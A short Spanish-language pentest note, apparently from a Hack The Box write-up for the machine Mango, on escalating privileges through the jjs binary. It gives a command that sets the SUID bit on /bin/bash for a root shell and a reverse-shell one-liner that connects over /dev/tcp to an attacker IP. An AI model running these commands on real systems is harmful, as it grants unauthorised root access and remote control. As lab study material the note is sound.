
## DESCRIPTION

![[Pasted image 20230603103328.png]]
![[Pasted image 20230603103335.png]]

#### Mas información
* Encontramos jjs → https://gtfobins.github.io/gtfobins/jjs/#shell


## EXPLOITATION

1. Cambiarle los permisos a /bin/bash

```
echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()" | jjs
bash -p → de privilege
```

![[Pasted image 20230603103440.png]]


2. Reverse shell:
IMPORTANTE: PONER UN NC Y UTILIZAR EL PARAMETRO -p en BASH

```
 echo "Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-p','-c','exec 5<>/dev/tcp/10.10.14.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done']).waitFor()" | jjs
```


![[Pasted image 20230603103506.png]]

## MACHINES

* Hack The Box: Mango

**!!NOTA IMPORTANTE!!** 